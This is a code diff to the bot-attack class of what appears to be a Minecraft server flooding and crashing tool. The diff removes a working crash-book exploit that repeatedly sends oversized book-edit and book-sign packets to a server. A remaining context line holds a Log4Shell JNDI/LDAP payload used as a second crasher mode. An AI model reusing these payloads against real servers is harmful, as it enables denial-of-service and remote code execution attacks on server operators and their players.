@@ -6,7 +6,6 @@ import cn.serendipityr.EndMinecraftPlusV2.VersionControl.*;
 import cn.serendipityr.EndMinecraftPlusV2.VersionControl.NewVersion.ACProtocol.AnotherStarAntiCheat;
 import cn.serendipityr.EndMinecraftPlusV2.VersionControl.NewVersion.ACProtocol.AntiCheat3;
 import cn.serendipityr.EndMinecraftPlusV2.VersionControl.NewVersion.ForgeProtocol.MCForge;
-import com.github.steveice10.mc.protocol.data.game.entity.metadata.ItemStack;
 import com.github.steveice10.mc.protocol.packet.ingame.client.ClientChatPacket;
 import com.github.steveice10.mc.protocol.packet.ingame.client.ClientKeepAlivePacket;
 import com.github.steveice10.mc.protocol.packet.ingame.client.ClientPluginMessagePacket;
@@ -23,21 +22,14 @@ import com.github.steveice10.mc.protocol.packet.ingame.server.entity.player.Serv
 import com.github.steveice10.mc.protocol.packet.ingame.serverbound.ServerboundCustomPayloadPacket;
 import com.github.steveice10.mc.protocol.packet.ingame.serverbound.ServerboundKeepAlivePacket;
 import com.github.steveice10.mc.protocol.packet.ingame.serverbound.player.ServerboundMovePlayerStatusOnlyPacket;
-import com.github.steveice10.opennbt.NBTIO;
-import com.github.steveice10.opennbt.tag.builtin.CompoundTag;
-import com.github.steveice10.opennbt.tag.builtin.ListTag;
-import com.github.steveice10.opennbt.tag.builtin.StringTag;
-import com.github.steveice10.opennbt.tag.builtin.Tag;
 import com.github.steveice10.packetlib.ProxyInfo;
 import com.github.steveice10.packetlib.Session;
 import com.github.steveice10.packetlib.event.session.*;
-import com.github.steveice10.packetlib.io.stream.StreamNetOutput;
 import com.github.steveice10.packetlib.packet.Packet;
 import io.netty.util.internal.ConcurrentSet;
 import net.kyori.adventure.text.Component;
 import net.kyori.adventure.text.serializer.plain.PlainTextComponentSerializer;
 
-import java.io.ByteArrayOutputStream;
 import java.io.OutputStream;
 import java.net.InetSocketAddress;
 import java.net.Proxy;
@@ -137,31 +129,7 @@ public class NewBotAttack extends IAttack {
                                 new Thread(() -> {
                                     switch (ConfigUtil.ServerCrasherMode) {
                                         case 1:
-                                            while (c.isConnected()) {
-                                                try {
-                                                    ItemStack crashBook = getCrashBook();
-
-                                                    ByteArrayOutputStream buf = new ByteArrayOutputStream();
-                                                    StreamNetOutput out = new StreamNetOutput(buf);
-
-                                                    out.writeShort(crashBook.getId());
-                                                    out.writeByte(crashBook.getAmount());
-
-                                                    NBTIO.writeTag(buf, crashBook.getNbt());
-
-                                                    byte[] crashData = buf.toByteArray();
-
-                                                    if (ProtocolLibs.adaptAfter758) {
-                                                        c.send(new ServerboundCustomPayloadPacket("MC|BEdit", crashData));
-                                                        c.send(new ServerboundCustomPayloadPacket("MC|BSign", crashData));
-                                                    } else {
-                                                        c.send(new ClientPluginMessagePacket("MC|BEdit", crashData));
-                                                        c.send(new ClientPluginMessagePacket("MC|BSign", crashData));
-                                                    }
-
-                                                    OtherUtils.doSleep(ConfigUtil.ServerCrasherPacketDelay);
-                                                } catch (Exception ignored) {}
-                                            }
+                                            LogUtil.doLog(0, "Book Crash仅适用于1.8.X版本。", "ServerCrasher");
                                             break;
                                         case 2:
                                             String log4jExploit = "${jndi:ldap://192.168.${RandomUtils.nextInt(1,253)}.${RandomUtils.nextInt(1,253)}}";
@@ -679,24 +647,5 @@ public class NewBotAttack extends IAttack {
                 LogUtil.doLog(0, "[服务端返回信息] [" + username + "] " + result.get("msg"), "BotAttack");
             }
         }
-    }
-
-    public static ItemStack getCrashBook() {
-        ItemStack crashBook;
-        CompoundTag nbtTag = new CompoundTag("crashBook");
-        List<Tag> pageList = new ArrayList<>();
-
-        // Plain Mode
-        nbtTag.put(new StringTag("author", OtherUtils.getRandomString(20, 20)));
-        nbtTag.put(new StringTag("title", OtherUtils.getRandomString(20, 20)));
-
-        for (int a = 0; a < 35; a++) {
-            pageList.add(new StringTag("", OtherUtils.getRandomString(600, 600)));
-        }
-
-        nbtTag.put(new ListTag("pages", pageList));
-        crashBook = new ItemStack(386, 1, nbtTag);
-
-        return crashBook;
     }
 }
